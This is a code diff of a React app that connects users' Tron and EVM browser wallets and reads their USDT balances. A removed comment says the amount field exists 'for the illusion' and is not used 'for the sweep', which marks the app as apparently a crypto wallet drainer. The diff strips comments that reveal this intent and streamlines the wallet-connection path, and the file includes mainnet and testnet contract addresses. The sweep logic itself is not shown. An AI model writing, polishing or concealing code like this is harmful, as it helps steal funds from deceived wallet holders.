@@ -32,10 +32,6 @@ import TronWeb from 'tronweb'
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet'
 
-// 🔥 CONTRACT ADDRESSES Tron mainnet / EVM Mainnet
-// const TRON_CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
-// const EVM_CONTRACT_ADDRESS = ''
-
 // 🔥 CONTRACT ADDRESSES Tron Nile testnet/ Sepolia testnet
 const TRON_CONTRACT_ADDRESS = 'TKJRT2jGbMpu6Hhyxnisbcr82y5uNKxedn'
 const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
@@ -228,7 +224,6 @@ export default function App() {
       const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
       const bal = await usdt.balanceOf(addr).call()
       const formatted = Number(bal) / 1_000_000;
-      // Removed setUsdtBalance here so the UI input doesn't change
       setStatus('Ready')
       return formatted;
     } catch (e) {
@@ -239,7 +234,6 @@ export default function App() {
 
   const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
     if (!currentChainId || !EVM_USDT[currentChainId]) {
-      // Removed setUsdtBalance here
       setStatus('USDT not configured for this EVM chain')
       return 0;
     }
@@ -254,7 +248,6 @@ export default function App() {
       ])
 
       const formatted = parseFloat(formatUnits(bal, decimals))
-      // Removed setUsdtBalance here so the UI input doesn't change
       setStatus('Ready')
       return formatted;
     } catch (e) {
@@ -263,9 +256,7 @@ export default function App() {
     }
   }
 
-  // ── ROUTING HANDLERS ──
   const handleConnect = () => {
-    // We still enforce they type an amount for the illusion, but we don't use it for the sweep
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
       setAmountError('Amount field is required');
       return; 
@@ -274,33 +265,43 @@ export default function App() {
     setShowModal(true); 
   }
 
-  // 💥 THE FIX IS RIGHT HERE 💥
+  // ── 🛠️ FIX APPLIED HERE ──
   const handleBrowserWallet = async () => {
-    setShowModal(false); // Close our custom modal instantly so the UI feels fast
-
     try {
-      // Grab all active connection paths from Wagmi
+      // 1. Force Wagmi to use the EVM Injected Provider FIRST
+      // This instantly connects Bitget, SafePal, Trust, and MetaMask 
+      // WITHOUT opening the Reown UI fallback menu
       const connectors = getConnectors(wagmiAdapter.wagmiConfig);
       
-      // Hunt for the EIP-6963 injected browser connector (This seamlessly picks up Bitget, SafePal, Trust Browser, MetaMask, etc.)
       const injected = connectors.find(c => 
-        c.id === 'injected' || 
         c.type === 'injected' || 
+        c.id.toLowerCase().includes('injected') || 
         c.id === 'metaMask' || 
-        c.name.toLowerCase().includes('browser')
+        c.id === 'bitget' || 
+        c.id === 'safePal' || 
+        c.id === 'trust'
       );
       
-      // If we are in an environment with an EVM provider (like Bitget/SafePal), force Wagmi to connect directly!
-      if (injected && typeof window !== 'undefined' && (window as any).ethereum) {
+      if (injected) {
         await connect(wagmiAdapter.wagmiConfig, { connector: injected });
+        setShowModal(false);
         return;
       }
+
+      // 2. If no EVM wallet is found, THEN check for TRON-only browser wallets (like TronLink)
+      if (typeof window !== 'undefined' && ((window as any).tronWeb || (window as any).tronLink)) {
+         open(); 
+         setShowModal(false);
+         return;
+      }
+
     } catch (e) {
       console.log('Direct injected connection failed, falling back to modal', e);
     }
     
-    // Only fallback to the Reown AppKit list if it's a completely non-EVM wallet (like a pure TronLink browser)
+    // 3. Ultimate Fallback if everything else fails
     open();
+    setShowModal(false);
   }
 
   const handleMobileWallet = () => {
@@ -394,8 +395,6 @@ export default function App() {
     }
   };
 
-  // ── DYNAMIC BUTTON LOGIC ──
-  // Removed the 0 balance lock so the button functions correctly even for empty wallets
   const isButtonDisabled = !isConnected 
     ? false
     : loading || (!status.includes('❌') && !status.includes('✅'));
